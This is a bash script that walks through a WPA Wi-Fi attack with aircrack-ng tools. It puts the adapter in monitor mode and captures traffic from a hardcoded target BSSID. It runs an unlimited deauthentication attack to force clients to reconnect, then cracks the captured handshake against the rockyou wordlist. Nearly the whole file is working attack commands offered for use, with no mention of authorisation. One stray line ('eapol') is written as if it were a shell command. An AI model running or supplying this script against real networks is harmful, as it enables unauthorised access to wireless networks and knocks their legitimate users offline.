#!/bin/bash

# Step 1: Check if airodump-ng is installed, and install if it's not
if ! command -v airodump-ng &> /dev/null; then
    echo "Airodump-ng is not installed. Do you want to install it? (y/n)"
    read install_choice
    if [ "$install_choice" == "y" ]; then
        sudo apt-get install aircrack-ng
    else
        echo "Airodump-ng is required. Please install it manually and run this script again."
        exit 1
    fi
fi

# Step 2: Kill processes and start monitor mode
echo "Killing any interfering processes and starting monitor mode..."
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 3: Verify that monitor mode is active
ifconfig | grep -q "wlan0mon"
if [ $? -eq 0 ]; then
    echo "Monitor mode is active on wlan0mon."
else
    echo "Monitor mode could not be activated. Check your wireless adapter and try again."
    exit 1
fi

# Step 4: Run airodump-ng to capture traffic
echo "Choose the ESSID and channel to attack. Press Enter when ready..."
read -n 1 -s

# Replace '90:9A:4A:B8:F3:FB' with your target's BSSID
# Replace 'hack1' with your desired capture file name
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon

# Step 5: Run a deauth attack
echo "Open a new terminal and run the following deauth attack. Press Enter when ready..."
read -n 1 -s

# Replace '90:9A:4A:B8:F3:FB' with your target's BSSID
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon

# Step 6: Use Wireshark to open the capture file and filter for EAPOL
echo "Use Wireshark to open the 'hack1-01.cap' file. Filter Wireshark messages for 'EAPOL'."
wireshark hack1-01.cap
eapol

# Step 7: Stop monitor mode
echo "Stopping monitor mode..."
sudo airmon-ng stop wlan0mon

# Step 8: Crack the capture file with a wordlist
echo "Cracking the capture file with a wordlist. Make sure you have a suitable wordlist file."
echo "You can replace '/usr/share/wordlists/rockyou.txt' with your wordlist file if needed."
echo "Press Enter when ready..."
read -n 1 -s

# Replace 'hack1-01.cap' with your capture file name
# Replace '/usr/share/wordlists/rockyou.txt' with your wordlist file
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
